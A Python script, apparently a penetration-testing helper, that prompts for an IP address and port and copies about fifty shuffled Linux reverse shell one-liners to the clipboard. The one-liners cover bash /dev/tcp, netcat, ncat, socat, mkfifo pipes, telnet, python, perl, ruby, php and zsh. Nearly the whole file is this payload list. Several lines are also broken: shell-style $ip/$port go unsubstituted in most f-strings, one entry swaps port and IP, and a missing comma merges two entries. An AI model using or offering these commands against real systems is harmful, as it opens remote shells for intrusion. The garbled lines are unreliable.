import random
import subprocess

def all_linux(ip, port):
    # Add your reverse shell commands here
    revshell_commands = [
        # Example commands
        f"sh -i >& /dev/tcp/$ip/$port 0>&1",
        f"0<&196;exec 196<>/dev/tcp/$ip/$port; sh <&196 >&196 2>&196",
        f"exec 5<>/dev/tcp/$ip/$port;cat <&5 | while read line; do $line 2>&5 >&5; done",
        f"sh -i >& /dev/tcp/$ip/$port 0>&1",
        f"0<&196;exec 196<>/dev/tcp/$ip/$port; sh <&196 >&196 2>&196",
        f"exec 5<>/dev/tcp/$ip/$port;cat <&5 | while read -r line; do \$line 2>&5 >&5; done",
        f"sh -i 5<> /dev/tcp/$port/$ip 0<&5 1>&5 2>&5",
        f"ruby -rsocket -e'f=TCPSocket.open(\"$ip\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        f"/bin/sh -i >& /dev/tcp/$ip/$port 0>&1",
        f"mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc $ip $port 1>/tmp/backpipe",
        f"zsh -c 'zmodload zsh/net/tcp && ztcp $ip $port && zsh >&\$REPLY 2>&\$REPLY 0>&\$REPLY'",
        f"perl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,\"$ip:$port\");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'"
        f"ncat $ip $port -e /bin/bash",
        f"ncat --udp $ip $port -e /bin/bash",
        f"rm -f /tmp/p; mknod /tmp/p p && nc $ip $port 0/tmp/p | /bin/sh 1>/tmp/p 2>/tmp/p",
        f"nc.traditional -e /bin/sh $ip $port",
        f"nc -c /bin/sh $ip $port",
        f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f",
        f"/bin/bash | nc $ip $port",
        f"/bin/bash -i >& /dev/tcp/$ip/$port 0>&1",
        f"socat exec:'/bin/sh -li',pty,stderr,setsid,sigint,sane tcp:$ip:$port",
        f"nc $ip $port -e /bin/sh",
        f"bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' 2>/dev/null",
        f"php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");' 2>/dev/null",
        f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2>/dev/null",
        f"bash -i >& /dev/tcp/$ip/$port 0>&1",
        f"/bin/sh | nc $ip $port",
        f"nc -e /bin/sh $ip $port",
        f"telnet $ip $port | /bin/bash | telnet $ip $port",
        f"telnet $ip $port | /bin/sh | telnet $ip $port",
        f"rm -f /tmp/p; mknod /tmp/p p && telnet $ip $port 0/tmp/p | /bin/sh 1>/tmp/p 2>/tmp/p",
        f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet $ip $port >/tmp/f",
        f"/bin/bash -i > /dev/tcp/$ip/$port 0<&1 2>&1",
        f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        f"/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' 2>/dev/null",
        f"php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");' 2>/dev/null",
        f"python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        f"perl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,\"$ip:$port\");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'",
        f"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
        f"bash -c 'exec bash -i &>/dev/tcp/{ip}/{port} <&1'",
        f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
        f"ncat {ip} {port} --udp -e /bin/bash",
        f"nc -e /bin/bash {ip} {port}",
        f"bash -c '0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196'",
        f"bash -c '0<&196;exec 196<>/dev/tcp/{ip}/{port}; bash <&196 >&196 2>&196'",
        f"bash -c '0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196'",
        f"perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system\$_ while<>;'",
        f"perl -MIO -e 'exec(\"/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1\")'",
        f"perl -e 'use Socket;\$i=\"{ip}\";\$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        f"perl -e 'use Socket;\$i=\"{ip}\";\$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");}};'",
        # Add more commands here
    ]

    # Shuffle the reverse shell commands
    random.shuffle(revshell_commands)

    # Copy the shuffled commands to the clipboard
    command_string = "\n".join(revshell_commands)
    subprocess.run(["echo", command_string], stdout=subprocess.PIPE)
    subprocess.run(["xclip", "-selection", "clipboard"], input=command_string.encode())

    print("[+] All Reverse Shell Commands Copied To Clipboard (in a different random order)")

# Take input for IP address and port number
ip = input("Enter the IP address: ")
port = input("Enter the port number: ")

# Call the function with the provided IP and port
all_linux(ip, port)
